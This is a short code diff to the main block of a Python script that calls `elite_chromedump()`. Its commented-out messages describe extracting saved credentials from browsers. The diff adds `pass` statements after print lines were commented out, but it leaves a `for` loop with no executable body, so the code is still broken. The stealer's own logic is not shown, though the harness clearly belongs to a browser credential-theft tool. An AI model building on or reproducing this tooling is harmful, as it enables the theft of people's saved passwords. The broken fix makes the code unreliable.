@@ -417,6 +417,7 @@ if __name__ == "__main__":
     result = elite_chromedump()
     
     if result['success']:
+        pass
     # print(f"✅ Browser credential extraction successful!")
     # print(f"Total credentials: {result['total_credentials']}")
     # print(f"Browsers checked: {result['browsers_checked']}")
@@ -424,6 +425,7 @@ if __name__ == "__main__":
         for cred in result['credentials'][:3]:  # Show first 3 for demo
     # print(f"  {cred['browser']}: {cred['username']}@{cred['url']}")
     else:
+        pass
     # print(f"❌ Browser credential extraction failed: {result.get('error', 'No credentials found')}")
     # print(f"Browsers checked: {result.get('browsers_checked', [])}")
     
